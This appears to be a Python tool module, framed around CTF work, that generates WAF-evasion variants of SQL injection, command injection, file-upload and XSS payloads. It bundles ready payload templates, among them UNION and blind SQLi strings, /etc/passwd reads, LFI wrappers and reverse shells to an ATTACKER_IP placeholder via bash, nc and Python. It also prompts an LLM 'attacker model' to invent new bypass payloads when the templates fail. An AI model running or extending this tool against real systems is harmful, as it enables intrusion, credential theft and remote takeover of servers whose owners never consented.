# tools/payload_mutator.py
"""
Payload变体生成器

策略：
1. 预定义模板（快速可靠）
2. AI补充（失败时触发）

支持的变体类型：
- SQL注入：编码、注释符、大小写
- 命令注入：分隔符、编码
- 文件上传：双写、空字节、解析漏洞
- XSS：编码、事件处理器
"""

import re
import json
import urllib.parse
import base64
from typing import List, Dict, Any, Optional, Callable


class PayloadMutator:
    """
    Payload变体生成器

    预定义模板为主，AI补充为辅
    """

    # =========================================================================
    # SQL注入变体
    # =========================================================================

    SQL_ENCODINGS: List[Callable] = [
        lambda p: p,                                    # 原始
        lambda p: p.upper(),                           # 大写
        lambda p: p.lower(),                           # 小写
        lambda p: p.swapcase(),                        # 大小写互换
        lambda p: urllib.parse.quote(p),               # URL编码
        lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # 双重URL编码
        lambda p: p.replace(' ', '/**/'),              # 注释替代空格
        lambda p: p.replace(' ', '%20'),               # 空格URL编码
        lambda p: p.replace(' ', '%09'),               # Tab编码
        lambda p: p.replace(' ', '${IFS}'),            # IFS变量
        lambda p: p.replace(' ', chr(11)),             # 垂直Tab
        lambda p: p.replace(' ', chr(12)),             # 换页符
        lambda p: p.replace(' ', '%0a'),               # 换行符
        lambda p: p.replace(' ', '%0d'),               # 回车符
        lambda p: p.replace(' ', '%0d%0a'),            # CRLF
    ]

    SQL_COMMENT_BYPASS: List[Callable] = [
        lambda p: p + '-- ',
        lambda p: p + '#',
        lambda p: p + '/**/',
        lambda p: p + '/*!*/',
        lambda p: p.replace(' ', '/**/'),
        lambda p: p.replace(' ', '/*!*/'),
        lambda p: re.sub(r'\b(SELECT|FROM|WHERE|AND|OR|UNION)\b',
                         lambda m: f'/*!{m.group(0)}*/', p, flags=re.I),
    ]

    SQL_DOUBLE_WRITE: Dict[str, Callable] = {
        'select': lambda p: re.sub(r'\bselect\b', 'selselectect', p, flags=re.I),
        'union': lambda p: re.sub(r'\bunion\b', 'ununionion', p, flags=re.I),
        'insert': lambda p: re.sub(r'\binsert\b', 'ininsertsert', p, flags=re.I),
        'update': lambda p: re.sub(r'\bupdate\b', 'upupdatedate', p, flags=re.I),
        'delete': lambda p: re.sub(r'\bdelete\b', 'dedeletelete', p, flags=re.I),
        'and': lambda p: re.sub(r'\band\b', 'anandd', p, flags=re.I),
        'or': lambda p: re.sub(r'\bor\b', 'oorr', p, flags=re.I),
    }

    # =========================================================================
    # 命令注入变体
    # =========================================================================

    CMD_SEPARATORS: List[str] = [
        ';',       # 标准分隔
        '|',       # 管道
        '||',      # 或
        '&&',      # 与
        '&',       # 后台
        '\n',      # 换行
        '\r\n',    # CRLF
        '`',       # 命令替换
        '$()',     # 命令替换
        '${}',     # 变量替换
        '%0a',     # URL换行
        '%0d%0a',  # URL CRLF
    ]

    CMD_ENCODINGS: List[Callable] = [
        lambda p: p,
        lambda p: urllib.parse.quote(p),
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: p.replace(' ', '${IFS}'),
        lambda p: p.replace(' ', '$IFS$9'),
        lambda p: p.replace(' ', '{IFS}'),
        lambda p: ''.join([f'\\{ord(c):03o}' for c in p]),  # 八进制
        lambda p: ''.join([f'\\x{ord(c):02x}' for c in p]),  # 十六进制
    ]

    CMD_BASH_TRICKS: List[Callable] = [
        lambda p: f'bash -c "{{echo,{base64.b64encode(p.encode()).decode()}}}|{{base64,-d}}|{{bash,-i}}"',
        lambda p: f'echo {base64.b64encode(p.encode()).decode()}|base64 -d|bash',
        lambda p: f'/bin/bash -c \'eval "$(echo {base64.b64encode(p.encode()).decode()}|base64 -d)"\'',
        lambda p: f'python -c "import os;os.system(\'{p}\')"',
        lambda p: f'perl -e "system(\'{p}\')"',
    ]

    # =========================================================================
    # 文件上传绕过
    # =========================================================================

    UPLOAD_EXTENSION_BYPASS: List[Callable] = [
        lambda n: n,                                              # 原始
        lambda n: n.replace('.php', '.php5'),                    # 替代后缀
        lambda n: n.replace('.php', '.phtml'),
        lambda n: n.replace('.php', '.pht'),
        lambda n: n.replace('.php', '.phps'),
        lambda n: n.replace('.php', '.php7'),
        lambda n: n.replace('.php', '.phar'),
        lambda n: n.replace('.php', '.inc'),
        lambda n: n.replace('.php', '.Php'),                     # 大小写
        lambda n: n.replace('.php', '.pHp'),
        lambda n: n.replace('.php', '.php%00.jpg'),              # 空字节
        lambda n: n.replace('.php', '.php\x00.jpg'),
        lambda n: n.replace('.php', '.php.jpg'),                 # 双后缀
        lambda n: n.replace('.php', '.php.png'),
        lambda n: n.replace('.php', '.php%0a.jpg'),              # 换行
        lambda n: n.replace('.php', 'php'),                      # 无后缀
        lambda n: n.replace('.php', '.phpphp'),                  # 双写
    ]

    UPLOAD_CONTENT_TYPE_BYPASS: List[str] = [
        'image/jpeg',
        'image/png',
        'image/gif',
        'application/pdf',
        'application/zip',
        'text/plain',
    ]

    # =========================================================================
    # XSS变体
    # =========================================================================

    XSS_EVENT_HANDLERS: List[str] = [
        'onload', 'onerror', 'onclick', 'onmouseover',
        'onfocus', 'onblur', 'onsubmit', 'onchange',
        'oninput', 'onkeydown', 'onkeyup', 'onkeypress',
        'ondblclick', 'ondrag', 'ondragend', 'ondragenter',
    ]

    XSS_ENCODINGS: List[Callable] = [
        lambda p: p,
        lambda p: urllib.parse.quote(p),
        lambda p: ''.join([f'&#x{ord(c):02x};' for c in p]),  # HTML实体(十六进制)
        lambda p: ''.join([f'&#{ord(c)};' for c in p]),       # HTML实体(十进制)
        lambda p: ''.join([f'\\u{ord(c):04x}' for c in p]),   # Unicode
        lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),  # HTML编码(会失效)
    ]

    XSS_TAG_BYPASS: List[Callable] = [
        lambda p: p,
        lambda p: p.replace('<script', '<ScRiPt'),
        lambda p: p.replace('<script', '<script/'),
        lambda p: p.replace('<script', '<script\x0d'),
        lambda p: p.replace('<script', '<script\x0a'),
        lambda p: p.replace(' ', '/'),                         # 斜杠替代空格
        lambda p: p.replace(' ', '%09'),                       # Tab
        lambda p: p.replace(' ', '%0a'),                       # 换行
    ]

    # =========================================================================
    # 公共方法
    # =========================================================================

    @classmethod
    def generate_sql_variants(cls, payload: str) -> List[str]:
        """
        生成SQL注入变体

        Args:
            payload: 基础payload，如 "1' OR '1'='1"

        Returns:
            变体列表
        """
        variants = set()

        # 基础编码变体
        for encoding in cls.SQL_ENCODINGS:
            try:
                variant = encoding(payload)
                if variant and variant != payload:
                    variants.add(variant)
            except Exception:
                pass

        # 注释符变体
        for encoding in cls.SQL_ENCODINGS:
            for comment in cls.SQL_COMMENT_BYPASS:
                try:
                    variant = comment(encoding(payload))
                    if variant:
                        variants.add(variant)
                except Exception:
                    pass

        # 双写绕过
        for bypass_fn in cls.SQL_DOUBLE_WRITE.values():
            try:
                variant = bypass_fn(payload)
                if variant and variant != payload:
                    variants.add(variant)
            except Exception:
                pass

        return list(variants)

    @classmethod
    def generate_cmd_variants(cls, payload: str) -> List[str]:
        """
        生成命令注入变体

        Args:
            payload: 基础命令，如 "whoami"

        Returns:
            变体列表
        """
        variants = set()

        # 分隔符 + 编码组合
        for sep in cls.CMD_SEPARATORS:
            for encoding in cls.CMD_ENCODINGS:
                try:
                    variant = f"{sep}{encoding(payload)}"
                    variants.add(variant)
                except Exception:
                    pass

        # Bash技巧
        for trick in cls.CMD_BASH_TRICKS:
            try:
                variant = trick(payload)
                variants.add(variant)
            except Exception:
                pass

        return list(variants)

    @classmethod
    def generate_upload_variants(cls, filename: str) -> List[str]:
        """
        生成文件上传绕过变体

        Args:
            filename: 原始文件名，如 "shell.php"

        Returns:
            变体文件名列表
        """
        variants = set()

        for bypass in cls.UPLOAD_EXTENSION_BYPASS:
            try:
                variant = bypass(filename)
                if variant:
                    variants.add(variant)
            except Exception:
                pass

        return list(variants)

    @classmethod
    def generate_xss_variants(cls, payload: str) -> List[str]:
        """
        生成XSS变体

        Args:
            payload: 基础payload，如 "<script>alert(1)</script>"

        Returns:
            变体列表
        """
        variants = set()

        # 标签绕过
        for tag_bypass in cls.XSS_TAG_BYPASS:
            for encoding in cls.XSS_ENCODINGS:
                try:
                    variant = encoding(tag_bypass(payload))
                    if variant:
                        variants.add(variant)
                except Exception:
                    pass

        return list(variants)

    @classmethod
    def generate_all_variants(cls, payload: str, vuln_type: str) -> List[str]:
        """
        根据漏洞类型生成所有变体

        Args:
            payload: 基础payload
            vuln_type: 漏洞类型 (sqli/cmdi/upload/xss)

        Returns:
            变体列表
        """
        generators = {
            "sqli": cls.generate_sql_variants,
            "sql": cls.generate_sql_variants,
            "cmdi": cls.generate_cmd_variants,
            "cmd": cls.generate_cmd_variants,
            "rce": cls.generate_cmd_variants,
            "upload": cls.generate_upload_variants,
            "xss": cls.generate_xss_variants,
        }

        generator = generators.get(vuln_type.lower())
        if generator:
            return generator(payload)

        return [payload]

    # =========================================================================
    # AI辅助
    # =========================================================================

    @classmethod
    def ai_generate_bypass(cls, failed_payloads: List[str],
                           response: str, vuln_type: str) -> str:
        """
        AI智能生成绕过payload

        当预定义变体全部失败时调用

        Args:
            failed_payloads: 已失败的payload列表
            response: 服务器响应特征
            vuln_type: 漏洞类型

        Returns:
            新的payload
        """
        from llm_client import llm_client
        from config import config

        prompt = f"""
你是一个CTF专家，需要生成绕过WAF的payload。

漏洞类型: {vuln_type}

已尝试失败的payload:
{json.dumps(failed_payloads[-10:], indent=2, ensure_ascii=False)}

服务器响应特征:
{response[:500]}

分析失败原因，生成一个新的绕过payload。
要求:
1. 只返回payload内容，不要解释
2. payload必须是有效的
3. 不要重复已失败的payload
"""

        try:
            result = llm_client.call_chat_completion(
                model=config.ATTACKER_MODEL,
                messages=[{"role": "user", "content": prompt}],
                temperature=0.7
            )
            return result.strip()
        except Exception as e:
            return f"AI生成失败: {str(e)}"


# 预定义的高频Payload模板
COMMON_PAYLOADS = {
    "sqli": {
        "basic": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "admin'--",
            "admin'#",
        ],
        "union": [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "1' UNION SELECT 1,database(),3--",
        ],
        "blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
        ],
        "error": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
    },
    "cmdi": {
        "basic": [
            "whoami",
            "id",
            "cat /etc/passwd",
            "ls -la",
            "pwd",
            "uname -a",
        ],
        "reverse_shell": [
            "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'",
            "nc -e /bin/bash ATTACKER_IP PORT",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        ],
    },
    "xss": {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
        ],
    },
    "lfi": {
        "basic": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain,<?php system($_GET['cmd']);?>",
        ],
    },
}


def get_common_payloads(vuln_type: str, subtype: str = "basic") -> List[str]:
    """
    获取常用Payload模板

    Args:
        vuln_type: 漏洞类型
        subtype: 子类型

    Returns:
        Payload列表
    """
    return COMMON_PAYLOADS.get(vuln_type, {}).get(subtype, [])


def register():
    """注册Payload变体生成器（作为工具注册）"""
    # PayloadMutator是纯Python类，不需要注册到ToolRegistry
    # 但可以作为其他工具的辅助模块
    pass